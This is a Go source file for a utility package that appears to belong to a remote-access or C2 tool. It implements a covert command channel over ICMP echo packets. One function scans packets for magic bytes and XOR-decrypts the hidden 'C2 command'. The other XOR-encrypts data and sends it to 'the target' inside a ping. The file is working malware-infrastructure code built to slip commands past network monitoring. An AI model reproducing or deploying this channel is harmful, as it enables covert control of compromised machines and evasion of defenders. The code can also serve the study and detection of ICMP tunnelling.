package utils

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const (
	ProtocolICMP = 1 // from golang.org/x/net/internal/iana, can't import Golang internal packages
)

var (
	magicBytes = []byte{0x59, 0x41, 0x02}
	xorKey     = []byte{0x14, 0x23}
)

/*
	Returns the decrypted message (C2 command) contained in the ICMP request.
*/
func ParseICMPConnection(conn net.PacketConn) ([]byte, icmp.Type, net.Addr, bool, error) {
	// Read ICMP message from packet
	var icmpRaw []byte = make([]byte, 1500)
	var icmpMsg *icmp.Message
	var icmpBody []byte
	var icmpCommandEncrypted []byte
	var icmpCommandDecrypted []byte
	var size int
	var dstAddr net.Addr

	/* Don't need a read deadline, will be waiting indefinitely for a message
	err := conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		return nil, nil, err
	}
	*/

	// Get raw packet bytes
	size, dstAddr, err := conn.ReadFrom(icmpRaw)
	if err != nil {
		return nil, nil, nil, false, err
	}

	// Structure data
	icmpMsg, err = icmp.ParseMessage(ProtocolICMP, icmpRaw[:size])
	if err != nil {
		return nil, nil, dstAddr, false, err
	}

	// Get bytes from packet body
	icmpBody, err = icmpMsg.Body.Marshal(ProtocolICMP)
	if err != nil {
		return nil, icmpMsg.Type, dstAddr, false, err
	}

	// Check for magic bytes: "<...> <magic> COMMAND"
	if bytes.Contains(icmpBody, magicBytes) {
		icmpCommandEncrypted = bytes.Split(icmpBody, magicBytes)[1]
		icmpCommandDecrypted = XorEncryptDecryptBytes(icmpCommandEncrypted, xorKey)
		return icmpCommandDecrypted, icmpMsg.Type, dstAddr, true, err
	} else {
		return icmpBody, icmpMsg.Type, dstAddr, false, err
	}
}

/*
	Send a command to the target.

	Resource: Simple utility package to send ICMP pings with Go - https://gist.github.com/lmas/c13d1c9de3b2224f9c26435eb56e6ef3
*/
func SendICMPData(conn net.PacketConn, target net.Addr, data []byte) (time.Time, error) {
	// Encrypt command
	encryptedData := XorEncryptDecryptBytes(data, xorKey)

	// Craft the ICMP message
	icmpMsg := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: append(magicBytes, encryptedData...),
		},
	}
	icmpRaw, err := icmpMsg.Marshal(nil)
	if err != nil {
		return time.Time{}, err
	}

	// Send it
	startTime := time.Now()
	numSentBytes, err := conn.WriteTo(icmpRaw, target)
	if err != nil {
		return startTime, err
	} else if numSentBytes != len(icmpRaw) {
		return startTime, fmt.Errorf("didn't send enough bytes: sent %v of %v", numSentBytes, len(icmpRaw))
	}

	return startTime, err
}
